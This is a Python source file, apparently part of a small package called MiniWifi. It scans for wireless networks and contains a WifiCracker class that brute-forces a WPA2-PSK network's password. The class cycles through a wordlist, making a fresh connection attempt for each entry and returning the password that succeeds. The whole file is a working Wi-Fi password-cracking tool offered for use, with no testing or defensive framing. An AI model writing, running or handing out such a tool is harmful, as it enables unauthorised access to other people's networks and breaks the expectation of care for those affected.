import pywifi
from pywifi import const
import time
from datetime import datetime
from .exceptions import MiniWifiException

class WifiScanner:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self._get_interface()

    def _get_interface(self):
        if len(self.wifi.interfaces()) == 0:
            raise MiniWifiException("No wireless interfaces found")
        return self.wifi.interfaces()[0]

    def scan_networks(self):
        self.iface.scan()
        time.sleep(5)
        return [net.ssid for net in self.iface.scan_results() if net.ssid]

class WifiCracker:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self._get_interface()
        self.current_attempt = 0
        self.start_time = None

    def _get_interface(self):
        if len(self.wifi.interfaces()) == 0:
            raise MiniWifiException("No wireless interfaces found")
        return self.wifi.interfaces()[0]

    def _create_profile(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        return profile

    def attempt_connection(self, ssid, password):
        self.current_attempt += 1
        self.iface.disconnect()
        time.sleep(1)

        profile = self._create_profile(ssid, password)
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(4)

        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        return {
            'success': self.iface.status() == const.IFACE_CONNECTED,
            'password': password,
            'attempt': self.current_attempt,
            'elapsed': elapsed
        }

    def crack(self, ssid, wordlist_path):
        self.start_time = datetime.now()
        self.current_attempt = 0
        
        try:
            with open(wordlist_path, "r", errors='ignore') as f:
                for line in f:
                    result = self.attempt_connection(ssid, line.strip())
                    if result['success']:
                        return result
        except FileNotFoundError:
            raise MiniWifiException(f"Wordlist file not found: {wordlist_path}")
        
        return {
            'success': False,
            'attempt': self.current_attempt,
            'elapsed': (datetime.now() - self.start_time).total_seconds()
        }